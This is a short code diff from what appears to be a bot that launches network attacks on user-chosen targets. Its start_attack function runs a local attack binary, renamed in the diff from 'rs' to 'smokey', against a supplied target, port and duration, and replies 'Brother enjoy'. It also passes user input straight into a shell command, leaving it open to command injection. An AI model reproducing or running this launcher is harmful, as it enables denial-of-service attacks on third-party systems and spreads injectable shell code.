@@ -301,7 +301,7 @@ def start_attack(user_id, target, port, time):
 
     try:
         # Simulate attack execution (original logic here)
-        full_command = f"./rs {target} {port} {time} 180"
+        full_command = f"./smokey {target} {port} {time} 180"
         process = subprocess.run(full_command, shell=True)
         response = f"Brother enjoy 👌. Target: {target} Port: {port} Time: {time}"
         return True, response
